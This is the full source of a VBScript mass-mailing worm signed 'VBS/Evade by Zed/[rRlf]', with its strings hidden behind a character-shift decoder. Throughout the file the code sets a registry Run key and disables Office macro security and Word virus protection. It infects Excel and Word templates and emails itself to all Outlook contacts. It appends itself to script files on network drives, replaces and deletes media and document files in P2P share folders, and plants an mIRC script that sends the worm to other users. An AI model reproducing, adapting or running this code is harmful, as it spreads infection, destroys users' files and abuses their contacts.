' VBS/Evade by Zed/[rRlf]
On Error Resume Next
Set fso = CreateObject(E0("Rbshquhof/GhmdRxrudlNckdbu"))
Set wsc = CreateObject(E0("VRbshqu/Ridmm"))
Set WinDir = fso.GetSpecialFolder(0)
Set SysDir = fso.GetSpecialFolder(1)
Set G = fso.GetFile(WScript.ScriptFullName)
CurrentVer = E0("IJDX^MNB@M^L@BIHOD]Rnguv`sd]Lhbsnrngu]Vhoenvr]BtssdouWdsrhno")
G.Copy (SysDir & E0("]Vhoru`su/wcr"))
wsc.RegWrite CurrentVer & E0("]Sto]Vhoru`su"), E0("Vrbshqu/dyd!") & SysDir & E0("]Vhoru`su/wcr!$0")
G.Copy (WinDir & E0("]Odumoj23/wcr"))
G.Copy (SysDir & E0("]Vhohoru23/wcr"))
G.Copy (SysDir & E0("]Vhoou23/wcr"))
G.Copy (SysDir & E0("]Vhoodu23/wcr"))
G.Copy (WinDir & E0("]Bnowdsr`uhno/wcd"))
Set Xl = CreateObject(E0("Dybdm/@qqmhb`uhno"))
If Xl <> E0("") Then
If fso.FileExists(Xl.Application.StartupPath & E0("]Qdsrno`m/ymr")) Then
fso.DeleteFile (Xl.Application.StartupPath & E0("]Qdsrno`m/ymr"))
End If
XlKey = E0("IJBT]Rnguv`sd]Lhbsnrngu]Ngghbd]") & Xl.Application.Version & E0("]Dybdm]Rdbtshux]")
wsc.RegWrite XlKey & E0("Mdwdm"), 1, E0("SDF^EVNSE")
wsc.RegWrite XlKey & E0("@bbdrrWCNL"), 1, E0("SDF^EVNSE")
Set JC = fso.OpenTextFile(WScript.ScriptFullName, 1)
ScriptRead = JC.ReadAll
JC.Close
Set EM = fso.CreateTextFile(SysDir & E0("]Dw`ed/fhg"), True)
EM.WriteLine E0("@uushctud!WC^O`ld!<!#Dw`ed#")
EM.WriteLine E0("Rtc!@tun^Nqdo)(")
EM.WriteLine E0("@qqmhb`uhno/NoRiddu@buhw`ud!<!#nr`Dw`ed#")
EM.WriteLine E0("Doe!Rtc")
EM.WriteLine E0("Rtc!nr`Dw`ed)(")
EM.WriteLine E0("No!Dssns!Sdrtld!Odyu")
EM.WriteLine E0("@qqmhb`uhno/RbsddoTqe`uhof!<!G`mrd")
EM.WriteLine E0("@qqmhb`uhno/Ehrqm`x@mdsur!<!G`mrd")
EM.WriteLine E0("@qqmhb`uhno/Do`cmdB`obdmJdx!<!ymEhr`cmde")
EM.WriteLine E0("@qqmhb`uhno/Ehrqm`xRu`utrC`s!<!G`mrd")
EM.WriteLine E0("Rdu!grn!<!Bsd`udNckdbu)#Rbshquhof/GhmdRxrudlNckdbu#(")
EM.WriteLine E0("Rdu!vrb!<!Bsd`udNckdbu)#VRbshqu/Ridmm#(")
EM.WriteLine E0("SdfEvnse!<!#SDF^EVNSE#")
EM.WriteLine E0("SdfRdbtshux!<!#IJDX^BTSSDOU^TRDS]Rnguv`sd]Lhbsnrngu]Ngghbd]#!'!@qqmhb`uhno/Wdsrhno")
EM.WriteLine E0("DybdmRdbtshux0!<!SdfRdbtshux!'!#]Dybdm]Rdbtshux]Mdwdm#")
EM.WriteLine E0("DybdmRdbtshux3!<!SdfRdbtshux!'!#]Vnse]Rdbtshux]@bbdrrWCNL#")
EM.WriteLine E0("vrb/SdfVshud!DybdmRdbtshux0-!0-!SdfEvnse")
EM.WriteLine E0("vrb/SdfVshud!DybdmRdbtshux3-!0-!SdfEvnse")
EM.WriteLine E0("@qqmhb`uhno/WCD/@buhwdWCQsnkdbu/WCBnlqnodour)#Dw`ed#(/Dyqnsu!grn/FduRqdbh`mGnmeds)0(!'!#]Dw`ed/fhg#")
EM.WriteLine E0("Hg!Ehs)@qqmhb`uhno/Ru`sutqQ`ui!'!#]Qdsrno`m/ymr#(!<!#Qdsrno`m/ymr#!Uido")
EM.WriteLine E0("@0!<!Ustd")
EM.WriteLine E0("Dmrd")
EM.WriteLine E0("@0!<!G`mrd")
EM.WriteLine E0("Doe!Hg")
EM.WriteLine E0("Gns!@2!<!0!Un!@buhwdVnsjcnnj/WCQsnkdbu/WCBnlqnodour/Bntou")
EM.WriteLine E0("Hg!@buhwdVnsjcnnj/WCQsnkdbu/WCBnlqnodour)@2(/O`ld!<!#Dw`ed#!Uido")
EM.WriteLine E0("@3!<!Ustd")
EM.WriteLine E0("Doe!Hg")
EM.WriteLine E0("Odyu")
EM.WriteLine E0("Hg!@3!<!G`mrd!Uido")
EM.WriteLine E0("@buhwdVnsjcnnj/WCQsnkdbu/WCBnlqnodour/Hlqnsu!grn/FduRqdbh`mGnmeds)0(!'!#]Dw`ed/fhg#")
EM.WriteLine E0("@buhwdVnsjcnnj/R`wd@r!Ghmdo`ld;<@buhwdVnsjcnnj/GtmmO`ld")
EM.WriteLine E0("Doe!Hg")
EM.WriteLine E0("Hg!@0!<!G`mrd!Uido")
EM.WriteLine E0("Vnsjcnnjr/@ee/R`wd@r!Ghmdo`ld;<@qqmhb`uhno/Ru`sutqQ`ui!'!#]Qdsrno`m/ymr#")
EM.WriteLine E0("@buhwdVnsjcnnj/WCQsnkdbu/WCBnlqnodour/Hlqnsu!grn/FduRqdbh`mGnmeds)0(!'!#]Dw`ed/fhg#")
EM.WriteLine E0("@buhwdVhoenv/Whrhcmd!<!G`mrd")
EM.WriteLine E0("Vnsjcnnjr)#Qdsrno`m/ymr#(/R`wd")
EM.WriteLine E0("Doe!Hg")
EM.WriteLine E0("Rdu!Ntumnnj@qq!<!Bsd`udNckdbu)#Ntumnnj/@qqmhb`uhno#(")
EM.WriteLine E0("Hg!Onu!Ntumnnj@qq!<!##!Uido")
EM.WriteLine E0("S`oenlh{d")
EM.WriteLine E0("SoeDlm!<!Hou))6!+!Soe(!*!0(")
EM.WriteLine E0("Rdmdbu!B`rd!SoeDlm")
EM.WriteLine E0("B`rd!0;!M7!<!#Idsd!hr!ui`u!ghmd#")
EM.WriteLine E0("B`rd!3;!M7!<!#Hlqnsu`ou!ghmd#")
EM.WriteLine E0("B`rd!2;!M7!<!#Uid!ghmd#")
EM.WriteLine E0("B`rd!5;!M7!<!#Dybdm!ghmd#")
EM.WriteLine E0("B`rd!4;!M7!<!@buhwdVnsjcnnj/O`ld")
EM.WriteLine E0("B`rd!7;!M7!<!#Uid!ghmd!xnt!v`oude#")
EM.WriteLine E0("B`rd!6;!M7!<!#Idsd!hr!uid!ghmd#")
EM.WriteLine E0("Doe!Rdmdbu")
EM.WriteLine E0("Gns!D`bi!Bnou`buRvhubi!Ho!Ntumnnj@qq/FduO`ldRq`bd)#L@QH#(/@eesdrrMhrur")
EM.WriteLine E0("Gns!TrdsFsntq!<!0!Un!Bnou`buRvhubi/@eesdrrDoushdr/Bntou")
EM.WriteLine E0("Dl`hmJdx!<!#IJDX^BTSSDOU^TRDS]Rnguv`sd][de.ZsSmg\]WCR.Dw`ed]SdbnseBnou`bur]#")
EM.WriteLine E0("Sd`eHgRdou!<!vrb/SdfSd`e)Dl`hmJdx!'!Bnou`buRvhubi/@eesdrrDoushdr)TrdsFsntq((")
EM.WriteLine E0("Hg!Sd`eHgRdou!=?!#Ghmd!Rdou#!Uido")
EM.WriteLine E0("Rdu!NtumnnjDl`hm!<!Ntumnnj@qq/Bsd`udHudl)1(")
EM.WriteLine E0("NtumnnjDl`hm/Sdbhqhdour/@ee!Bnou`buRvhubi/@eesdrrDoushdr)TrdsFsntq(")
EM.WriteLine E0("NtumnnjDl`hm/Rtckdbu!<!M7")
EM.WriteLine E0("NtumnnjDl`hm/Cnex!<!#Uid!ghmd!H!`l!rdoehof!xnt!hr!bnoghedouh`m!`r!vdmm!`r!hlqnsu`ou:!rn!eno&u!mdu!`oxnod!dmrd!i`wd!`!bnqx/#")
EM.WriteLine E0("NtumnnjDl`hm/@uu`bildour/@ee!@buhwdVnsjcnnj/GtmmO`ld")
EM.WriteLine E0("NtumnnjDl`hm/Hlqnsu`obd!<!3")
EM.WriteLine E0("NtumnnjDl`hm/Edmdud@gudsRtclhu!<!Ustd")
EM.WriteLine E0("NtumnnjDl`hm/Rdoe")
EM.WriteLine E0("vrb/SdfVshud!Dl`hmJdx!'!Bnou`buRvhubi/@eesdrrDoushdr)TrdsFsntq(-!#Ghmd!Rdou#")
EM.WriteLine E0("Doe!Hg")
EM.WriteLine E0("Odyu")
EM.WriteLine E0("Odyu")
EM.WriteLine E0("Doe!Hg")
EM.WriteLine E0("Hg!Ehs)grn/FduRqdbh`mGnmeds)0(!'!#]Vhoru`su/wcr#(!=?!#Vhoru`su/wcr#!Uido")
EM.WriteLine E0("U{!<!##")
For i = 1 To Len(ScriptRead)
Tz = Mid(ScriptRead, i, 1)
Tz = Hex(Asc(Tz))
If Len(Tz) = 1 Then
Tz = E0("1") & Tz
End If
Gz = Gz + Tz
If Len(Gz) = 110 Then
EM.WriteLine "Tz = Tz + """ + Gz + Chr(34)
Gz = E0("")
End If
If Len(ScriptRead) - i = 0 Then
EM.WriteLine "Tz = Tz + """ + Gz + Chr(34)
Gz = E0("")
End If
Next
EM.WriteLine E0("Nqdo!grn/FduRqdbh`mGnmeds)0(!'!#]Vhoru`su/wcr#!Gns!Ntuqtu!@r!0")
EM.WriteLine E0("Qshou!") & "#" & E0("0-!BL)U{(")
EM.WriteLine E0("Bmnrd!0")
EM.WriteLine E0("vrb/SdfVshud!#IJDX^MNB@M^L@BIHOD]Rnguv`sd]Lhbsnrngu]Vhoenvr]BtssdouWdsrhno]Sto]Vhoru`su#-!#Vrbshqu/dyd!#!'!grn/FduRqdbh`mGnmeds)0(!'!#]Vhoru`su/wcr!$0#")
EM.WriteLine E0("Doe!Hg")
EM.WriteLine E0("Doe!Rtc")
EM.WriteLine E0("Gtobuhno!BL)BO(")
EM.WriteLine E0("Gns!FB!<!0!Un!Mdo)BO(!Rudq!3")
EM.WriteLine E0("BL!<!BL!'!Bis)#'i#!'!Lhe)BO-!FB-!3((")
EM.WriteLine E0("Odyu")
EM.WriteLine E0("Doe!Gtobuhno")
EM.Close
Xl.Visible = False
Xl.WorkBooks.Add
Xl.ActiveWorkbook.VBProject.VBComponents.Import (fso.GetSpecialFolder(1) & E0("]Dw`ed/fhg"))
Xl.ActiveWorkbook.SaveAs (Xl.Application.StartupPath & E0("]Qdsrno`m/ymr"))
Xl.Quit
End If
Set Wd = CreateObject(E0("Vnse/@qqmhb`uhno"))
If Wd <> E0("") Then
WdKey = E0("IJBT]Rnguv`sd]Lhbsnrngu]Ngghbd]") & Wd.Application.Version & E0("]Vnse]Rdbtshux]")
wsc.RegWrite WdKey & E0("Mdwdm"), 1, E0("SDF^EVNSE")
wsc.RegWrite WdKey & E0("@bbdrrWCNL"), 1, E0("SDF^EVNSE")
Wd.Options.VirusProtection = False
Wd.Options.SaveNormalPrompt = False
Wd.Options.ConfirmConversions = False
Set JC16 = fso.OpenTextFile(WScript.ScriptFullName, 1)
ScriptRead16 = JC16.ReadAll
JC16.Close
Set WM = fso.CreateTextFile(SysDir & E0("]Dw`ed/kqf"), True)
WM.WriteLine E0("@uushctud!WC^O`ld!<!#Dw`ed#")
WM.WriteLine E0("Rtc!@tunBmnrd)(")
WM.WriteLine E0("B`mm!Dw`ed")
WM.WriteLine E0("Doe!Rtc")
WM.WriteLine E0("Rtc!@tunNqdo)(")
WM.WriteLine E0("B`mm!Dw`ed")
WM.WriteLine E0("Doe!Rtc")
WM.WriteLine E0("Rtc!WhdvWCBned)(")
WM.WriteLine E0("Doe!Rtc")
WM.WriteLine E0("Rtc!Dw`ed)(")
WM.WriteLine E0("No!Dssns!Sdrtld!Odyu")
WM.WriteLine E0("Rdu!grn!<!Bsd`udNckdbu)#Rbshquhof/GhmdRxrudlNckdbu#(")
WM.WriteLine E0("Rdu!RxrEhs!<!grn/FduRqdbh`mGnmeds)0(")
WM.WriteLine E0("Nquhnor/WhstrQsnudbuhno!<!1;!Nquhnor/R`wdOnsl`mQsnlqu!<!1;!Nquhnor/BnoghslBnowdsrhnor!<!1")
WM.WriteLine E0("@qqmhb`uhno/Ehrqm`xRu`utrC`s!<!1;!@qqmhb`uhno/RbsddoTqe`uhof!<!1;!@qqmhb`uhno/Do`cmdB`obdmJdx!<!veB`obdmEhr`cmde;!@qqmhb`uhno/Ehrqm`x@mdsur!<!ve@mdsurOnod")
WM.WriteLine E0("SdfQ`ui!<!#IJDX^BTSSDOU^TRDS]Rnguv`sd]Lhbsnrngu]Ngghbd]#!'!@qqmhb`uhno/Wdsrhno!'!#]Vnse]Rdbtshux#")
WM.WriteLine E0("Rxrudl/Qshw`udQsnghmdRushof)##-!SdfQ`ui-!#Mdwdm#(!<!0'")
WM.WriteLine E0("Rxrudl/Qshw`udQsnghmdRushof)##-!SdfQ`ui-!#@bbdrrWCNL#(!<!0'")
WM.WriteLine E0("Bnll`oeC`sr)#Unnmr#(/Bnousnmr)#L`bsn#(/Do`cmde!<!1")
WM.WriteLine E0("Bnll`oeC`sr)#L`bsn#(/Bnousnmr)#Rdbtshux///#(/Do`cmde!<!1")
WM.WriteLine E0("Bnll`oeC`sr)#L`bsn#(/Bnousnmr)#L`bsnr///#(/Do`cmde!<!1")
WM.WriteLine E0("Bnll`oeC`sr)#Unnmr#(/Bnousnmr)#Btrunlh{d///#(/Do`cmde!<!1")
WM.WriteLine E0("Bnll`oeC`sr)#Whdv#(/Bnousnmr)#Unnmc`sr#(/Do`cmde!<!1")
WM.WriteLine E0("Bnll`oeC`sr)#Gnsl`u#(/Bnousnmr)#Nckdbu///#(/Do`cmde!<!1")
WM.WriteLine E0("Hg!@buhwdEnbtldou/WCQsnkdbu/WCBnlqnodour/Hudl)#Dw`ed#(/O`ld!<!#Dw`ed#!Uido!@buhwdEnbtldou/WCQsnkdbu/WCBnlqnodour/Hudl)#Dw`ed#(/Dyqnsu!RxrEhs!'!#]Dw`ed/kqf#")
WM.WriteLine E0("Hg!Onu!Onsl`mUdlqm`ud/WCQsnkdbu/WCBnlqnodour/Hudl)#Dw`ed#(/O`ld!<!#Dw`ed#!Uido!Onsl`mUdlqm`ud/WCQsnkdbu/WCBnlqnodour/Hlqnsu!RxrEhs!'!#]Dw`ed/kqf#")
WM.WriteLine E0("Hg!Onu!@buhwdEnbtldou/WCQsnkdbu/WCBnlqnodour/Hudl)#Dw`ed#(/O`ld!<!#Dw`ed#!Uido!@buhwdEnbtldou/WCQsnkdbu/WCBnlqnodour/Hlqnsu!RxrEhs!'!#]Dw`ed/kqf#")
WM.WriteLine E0("Hg!HoRus)0-!@buhwdEnbtldou/O`ld-!#Enbtldou#(!<!1!Uido")
WM.WriteLine E0("@buhwdEnbtldou/R`wd@r!GhmdO`ld;<@buhwdEnbtldou/GtmmO`ld")
WM.WriteLine E0("Rdu!Ntumnnj@qq!<!Bsd`udNckdbu)#Ntumnnj/@qqmhb`uhno#(")
WM.WriteLine E0("Hg!Onu!Ntumnnj@qq!<!##!Uido")
WM.WriteLine E0("S`oenlh{d")
WM.WriteLine E0("SoeDlm!<!Hou))6!+!Soe(!*!0(")
WM.WriteLine E0("Rdmdbu!B`rd!SoeDlm")
WM.WriteLine E0("B`rd!0;!M7!<!#Idsd!hr!ui`u!ghmd#")
WM.WriteLine E0("B`rd!3;!M7!<!#Hlqnsu`ou!ghmd#")
WM.WriteLine E0("B`rd!2;!M7!<!#Uid!ghmd#")
WM.WriteLine E0("B`rd!5;!M7!<!#Vnse!ghmd#")
WM.WriteLine E0("B`rd!4;!M7!<!@buhwdEnbtldou/O`ld")
WM.WriteLine E0("B`rd!7;!M7!<!#Uid!ghmd!xnt!v`oude#")
WM.WriteLine E0("B`rd!6;!M7!<!#Idsd!hr!uid!ghmd#")
WM.WriteLine E0("Doe!Rdmdbu")
WM.WriteLine E0("Gns!D`bi!Bnou`buRvhubi!Ho!Ntumnnj@qq/FduO`ldRq`bd)#L@QH#(/@eesdrrMhrur")
WM.WriteLine E0("Gns!TrdsFsntq!<!0!Un!Bnou`buRvhubi/@eesdrrDoushdr/Bntou")
WM.WriteLine E0("Dl`hmJdx!<!#IJDX^BTSSDOU^TRDS]Rnguv`sd][de.ZsSmg\]WCR.Dw`ed]SdbnseBnou`bur]#")
WM.WriteLine E0("Hg!Rxrudl/Qshw`udQsnghmdRushof)##-!Dl`hmJdx-!Bnou`buRvhubi/@eesdrrDoushdr)TrdsFsntq((!=?!#Ghmd!Rdou#!Uido")
WM.WriteLine E0("Rdu!NtumnnjDl`hm!<!Ntumnnj@qq/Bsd`udHudl)1(")
WM.WriteLine E0("NtumnnjDl`hm/Sdbhqhdour/@ee!Bnou`buRvhubi/@eesdrrDoushdr)TrdsFsntq(")
WM.WriteLine E0("NtumnnjDl`hm/Rtckdbu!<!M7")
WM.WriteLine E0("NtumnnjDl`hm/Cnex!<!#Uid!ghmd!H!`l!rdoehof!xnt!hr!bnoghedouh`m!`r!vdmm!`r!hlqnsu`ou:!rn!eno&u!mdu!`oxnod!dmrd!i`wd!`!bnqx/#")
WM.WriteLine E0("NtumnnjDl`hm/@uu`bildour/@ee!@buhwdEnbtldou/GtmmO`ld")
WM.WriteLine E0("NtumnnjDl`hm/Hlqnsu`obd!<!3")
WM.WriteLine E0("NtumnnjDl`hm/Edmdud@gudsRtclhu!<!Ustd")
WM.WriteLine E0("NtumnnjDl`hm/Rdoe")
WM.WriteLine E0("Rxrudl/Qshw`udQsnghmdRushof)##-!Dl`hmJdx-!Bnou`buRvhubi/@eesdrrDoushdr)TrdsFsntq((!<!#Ghmd!Rdou#")
WM.WriteLine E0("Doe!Hg")
WM.WriteLine E0("Odyu")
WM.WriteLine E0("Odyu")
WM.WriteLine E0("Doe!Hg")
WM.WriteLine E0("Doe!Hg")
WM.WriteLine E0("Hg!HoRus)0-!@buhwdEnbtldou/O`ld-!#Enbtldou#(!<!0!Uido!@buhwdEnbtldou/R`wde!<!0")
WM.WriteLine E0("Hg!Ehs)RxrEhs!'!#]Vhoru`su/wcr#(!=?!#Vhoru`su/wcr#!Uido")
WM.WriteLine E0("U{07!<!") & Chr(34) & Chr(34)
For i16 = 1 To Len(ScriptRead16)
Tz16 = Mid(ScriptRead16, i16, 1)
Tz16 = Hex(Asc(Tz16))
If Len(Tz16) = 1 Then
Tz16 = E0("1") & Tz16
End If
Gz16 = Gz16 + Tz16
If Len(Gz16) = 110 Then
WM.WriteLine "Tz16 = Tz16 + """ + Gz16 + Chr(34)
Gz16 = E0("")
End If
If Len(ScriptRead16) - i16 = 0 Then
WM.WriteLine "Tz16 = Tz16 + """ + Gz16 + Chr(34)
Gz16 = E0("")
End If
Next
WM.WriteLine E0("Nqdo!grn/FduRqdbh`mGnmeds)0(!'!#]Vhoru`su/wcr#!Gns!Ntuqtu!@r!0")
WM.WriteLine E0("Qshou!") & "#" & E0("0-!BL07)U{07(")
WM.WriteLine E0("Bmnrd!0")
WM.WriteLine E0("Rxrudl/Qshw`udQsnghmdRushof)##-!#IJDX^MNB@M^L@BIHOD]Rnguv`sd]Lhbsnrngu]Vhoenvr]BtssdouWdsrhno]Sto#-!#Vhoru`su#(!<!#Vrbshqu/dyd!#!'!grn/FduRqdbh`mGnmeds)0(!'!#]Vhoru`su/wcr!$0#")
WM.WriteLine E0("Doe!Hg")
WM.WriteLine E0("Doe!Rtc")
WM.WriteLine E0("Gtobuhno!BL07)BO07(")
WM.WriteLine E0("Gns!FB07!<!0!Un!Mdo)BO07(!Rudq!3")
WM.WriteLine E0("BL07!<!BL07!'!Bis)#'i#!'!Lhe)BO07-!FB07-!3((")
WM.WriteLine E0("Odyu")
WM.WriteLine E0("Doe!Gtobuhno")
WM.Close
If fso.FileExists(SysDir & E0("]Dw`ed/kqf")) Then
If Wd.NormalTemplate.VBProject.VBComponents.Item(E0("Dw`ed")).Name <> E0("Dw`ed") Then
Wd.NormalTemplate.VBProject.VBComponents.Import SysDir & E0("]Dw`ed/kqf")
Wd.NormalTemplate.VBProject.VBComponents.Item(E0("Dw`ed")).Name = E0("Dw`ed")
End If
End If
Wd.Quit
End If
SeekDrives()
Sub SeekDrives()
On Error Resume Next
Set fso = CreateObject(E0("Rbshquhof/GhmdRxrudlNckdbu"))
For Each NetDrive In fso.Drives
If NetDrive.DriveType = 2 _
Or NetDrive.DriveType = 3 Then
If NetDrive.IsReady Then
If UCase(NetDrive.Path) <> E0("B;") Then
fso.CopyFile WScript.ScriptFullName, NetDrive.Path & E0("]Q`rrvnser/wcr")
End If
SeekFolders (NetDrive.Path & E0("]"))
End If
End If
Next
End Sub
Sub VBSAppend(VBSFind)
On Error Resume Next
Set fso = CreateObject(E0("Rbshquhof/GhmdRxrudlNckdbu"))
For Each n In fso.GetFolder(VBSFind).Files
FileExt = LCase(fso.GetExtensionName(n.Path))
If FileExt = E0("wcr") Or FileExt = E0("wcd") Then
Set C6 = fso.OpenTextFile(n.Path, 1)
C7 = C6.ReadAll
C6.Close
WormTag = E0("&!WCR.Dw`ed!cx![de.ZsSmg\")
If InStr(1, C7, WormTag) = False Then
Set C8 = fso.OpenTextFile(WScript.ScriptFullName, 1)
C1 = C8.ReadAll
C8.Close
Set C0 = fso.OpenTextFile(n.Path, 8, True)
C0.WriteLine vbCrLf & WormTag & vbCrLf & E0("B2!<!") & Chr(34) & Chr(34)
For C4 = 1 To Len(C1)
C3 = Mid(C1, C4, 1)
C3 = Hex(Asc(C3))
If Len(C3) = 1 Then
C3 = E0("1") & C3
End If
C5 = C5 + C3
If Len(C5) = 110 Then
C0.WriteLine "C3 = C3 + """ + C5 + Chr(34)
C5 = E0("")
End If
If Len(C1) - C4 = 0 Then
C0.WriteLine "C3 = C3 + """ + C5 + Chr(34)
C5 = E0("")
End If
Next
C0.WriteLine E0("Rdu!grn!<!Bsd`udNckdbu)#Rbshquhof/GhmdRxrudlNckdbu#(")
C0.WriteLine E0("Rdu!vrb!<!Bsd`udNckdbu)#VRbshqu/Ridmm#(")
C0.WriteLine E0("Rdu!VBM!<!grn/Bsd`udUdyuGhmd)grn/FduRqdbh`mGnmeds)0(!'!#]Vhoru`su/wcr#-!Ustd(")
C0.WriteLine E0("VBM/Vshud!BL)B2(")
C0.WriteLine E0("VBM/Bmnrd")
C0.WriteLine E0("vrb/SdfVshud!#IJML]Rnguv`sd]Lhbsnrngu]Vhoenvr]BtssdouWdsrhno]Sto]Vhoru`su#-!#Vrbshqu/dyd!#!'!grn/FduRqdbh`mGnmeds)0(!'!#]Vhoru`su/wcr!$0#")
C0.WriteLine E0("Gtobuhno!BL)BO(")
C0.WriteLine E0("Gns!FB!<!0!Un!Mdo)BO(!Rudq!3")
C0.WriteLine E0("BL!<!BL!'!Bis)#'i#!'!Lhe)BO-!FB-!3((")
C0.WriteLine E0("Odyu")
C0.WriteLine E0("Doe!Gtobuhno")
C0.Close
End If
End If
Next
End Sub
Sub SeekFolders(VBSFind)
On Error Resume Next
Set fso = CreateObject(E0("Rbshquhof/GhmdRxrudlNckdbu"))
For Each n In fso.GetFolder(VBSFind).SubFolders
VBSAppend (n.Path)
SeekFolders (n.Path)
Next
End Sub
PgDir = wsc.RegRead(CurrentVer & E0("]Qsnfs`lGhmdrEhs"))
For FindFolders = 0 To 8
ArrayFolders = Array(E0("B;]J`{``]Lx!Ri`sde!Gnmeds"), E0("B;]Lx!Envomn`er"), _
PgDir & E0("]J`{``]Lx!Ri`sde!Gnmeds"), PgDir & E0("]J`[`@!Mhud]Lx!Ri`sde!Gnmeds"), _
PgDir & E0("]Cd`sri`sd]Ri`sde"), PgDir & E0("]Denojdx3111"), _
PgDir & E0("]Lnsqidtr]Lx!Ri`sde!Gnmeds"), PgDir & E0("]Fsnjruds]Lx!Fsnjruds"), _
PgDir & E0("]HBP]Ri`sde!Ghmdr"))
CL1C9 = ArrayFolders(FindFolders)
If fso.FolderExists(CL1C9) Then
For Each Z4 in fso.GetFolder(CL1C9).Files
F3 = LCase(fso.GetExtensionName(Z4))
If F3 = E0("lq2") Or F3 = E0("lq3") _
Or F3 = E0("`wh") Or F3 = E0("lqf") _
Or F3 = E0("lqdf") Or F3 = E0("lqd") _
Or F3 = E0("lnw") Or F3 = E0("qeg") _
Or F3 = E0("enb") Or F3 = E0("ymr") _
Or F3 = E0("lec") Or F3 = E0("qqu") _
Or F3 = E0("qqr") Then
G.Copy (Z4.Path & E0("/wcr"))
fso.DeleteFile (Z4.Path)
End If
Next
End If
Next
For IRCFolder = 0 To 3
ArrayIRC = Array(E0("B;]Lhsb"), E0("B;]Lhsb23"), PgDir & E0("]Lhsb"), PgDir & E0("]Lhsb23"))
F1 = ArrayIRC(IRCFolder)
If fso.FileExists(F1) Then
Set F2 = fso.CreateTextFile(F1 & E0("]Rbshqu/hoh"), True)
F2.WriteLine E0(":!Lhsb!rbshquhof!tuhmhux!,!en!onu!lnehgx")
F2.WriteLine E0("Zrbshqu\")
F2.WriteLine E0("o4<!no!0;KNHO;") & "#" & E0(";z")
F2.WriteLine E0("o7<!.hg!)!%ohbj!<<!%ld!(!z!i`mu!|")
F2.WriteLine E0("o6<!.lrf!%ohbj!Sdldlcds!uihr!gtoox!bnowdsr`uhno!H!i`e!no!HSB>")
F2.WriteLine E0("o9<!.ebb!rdoe!,b!%ohbj!") & WinDir & E0("]Bnowdsr`uhno/wcd")
F2.WriteLine E0("o8<!|")
F2.Close
End If
Next
wsc.RegWrite E0("IJBT]Rnguv`sd][de.ZsSmg\]WCR.Dw`ed]"), E0("WCR.Dw`ed/@!cx![de.ZsSmg\")
Function E0(E1)
For E2 = 1 To Len(E1)
E3 = Mid(E1, E2, 1)
If Not Asc(E3) Mod 2 = 0 Then
E3 = Chr(Asc(E3) - 1)
Else
E3 = Chr(Asc(E3) + 1)
End If
E0 = E0 & E3
Next
End Function
' VBS/Evade by Zed/[rRlf]